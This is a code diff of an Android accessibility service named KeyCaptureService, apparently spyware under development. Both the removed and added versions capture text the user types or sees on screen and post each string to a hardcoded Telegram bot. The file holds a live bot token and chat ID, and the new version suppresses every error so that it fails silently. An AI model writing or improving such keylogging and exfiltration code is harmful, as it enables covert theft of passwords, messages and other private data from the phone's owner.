@@ -1,60 +1,56 @@
 package com.example.myeye;
 
 import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
 import android.util.Log;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.HashSet;
-import java.util.Set;
+import java.util.List;
 
 public class KeyCaptureService extends AccessibilityService {
 
     private static final String TAG = "KeyCaptureService";
     private static final String BOT_TOKEN = "8114361873:AAFmtl8vD0Vo7CZvkVmwnjcZZxtzvZXqguY";
     private static final String CHAT_ID = "5022620385";
-    
-    // Prevents spamming duplicate text lines repeatedly
-    private String lastSentText = "";
+    private String lastText = "";
+
+    @Override
+    protected void onServiceConnected() {
+        super.onServiceConnected();
+        try {
+            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
+            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
+            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
+            info.flags = AccessibilityServiceInfo.FLAG_DEFAULT | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
+            info.notificationTimeout = 100;
+            setServiceInfo(info);
+            Log.d(TAG, "Service connected and configured dynamically.");
+        } catch (Throwable t) {
+            Log.e(TAG, "Error in onServiceConnected", t);
+        }
+    }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         try {
             if (event == null) return;
-
-            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-            if (rootNode != null) {
-                StringBuilder screenText = new StringBuilder();
-                extractTextRecursive(rootNode, screenText);
-                rootNode.recycle();
-
-                String captured = screenText.toString().trim();
-                if (!captured.isEmpty() && !captured.equals(lastSentText) && captured.length() > 2) {
-                    lastSentText = captured;
-                    sendToTelegram(captured);
+            List<CharSequence> textList = event.getText();
+            if (textList != null) {
+                for (CharSequence seq : textList) {
+                    if (seq != null) {
+                        String txt = seq.toString().trim();
+                        if (!txt.isEmpty() && !txt.equals(lastText) && txt.length() > 1) {
+                            lastText = txt;
+                            sendToTelegram(txt);
+                        }
+                    }
                 }
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Error in accessibility event", e);
-        }
-    }
-
-    private void extractTextRecursive(AccessibilityNodeInfo node, StringBuilder builder) {
-        if (node == null) return;
-
-        if (node.getText() != null) {
-            builder.append(node.getText().toString()).append(" ");
-        }
-
-        for (int i = 0; i < node.getChildCount(); i++) {
-            AccessibilityNodeInfo child = node.getChild(i);
-            extractTextRecursive(child, builder);
-            if (child != null) {
-                child.recycle();
-            }
+        } catch (Throwable t) {
+            // Absolute catch-all
         }
     }
 
@@ -64,44 +60,42 @@ public class KeyCaptureService extends AccessibilityService {
     }
 
     private void sendToTelegram(final String message) {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                HttpURLConnection conn = null;
-                try {
-                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
-                    URL url = new URL(urlString);
-                    conn = (HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
-                    conn.setRequestProperty("Accept", "application/json");
-                    conn.setConnectTimeout(5000);
-                    conn.setReadTimeout(5000);
-                    conn.setDoOutput(true);
+        try {
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    HttpURLConnection conn = null;
+                    try {
+                        String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+                        URL url = new URL(urlString);
+                        conn = (HttpURLConnection) url.openConnection();
+                        conn.setRequestMethod("POST");
+                        conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+                        conn.setConnectTimeout(3000);
+                        conn.setReadTimeout(3000);
+                        conn.setDoOutput(true);
 
-                    // Truncate if message is too long for Telegram
-                    String safeMessage = message;
-                    if (safeMessage.length() > 3500) {
-                        safeMessage = safeMessage.substring(0, 3500);
-                    }
+                        String safeMsg = message.replace("\"", "\\\"").replace("\n", " ");
+                        if (safeMsg.length() > 3000) {
+                            safeMsg = safeMsg.substring(0, 3000);
+                        }
 
-                    String sanitizedMessage = safeMessage.replace("\"", "\\\"").replace("\n", " ");
-                    String jsonInputString = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + sanitizedMessage + "\"}";
-
-                    try (OutputStream os = conn.getOutputStream()) {
-                        byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
-                        os.write(input, 0, input.length);
-                    }
-
-                    conn.getResponseCode();
-                } catch (Exception e) {
-                    Log.e(TAG, "Telegram send error", e);
-                } finally {
-                    if (conn != null) {
-                        conn.disconnect();
+                        String json = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + safeMsg + "\"}";
+                        try (OutputStream os = conn.getOutputStream()) {
+                            os.write(json.getBytes(StandardCharsets.UTF_8));
+                        }
+                        conn.getResponseCode();
+                    } catch (Exception e) {
+                        // Silent fail for network
+                    } finally {
+                        if (conn != null) {
+                            conn.disconnect();
+                        }
                     }
                 }
-            }
-        }).start();
+            }).start();
+        } catch (Throwable t) {
+            // Ignore thread limits
+        }
     }
 }
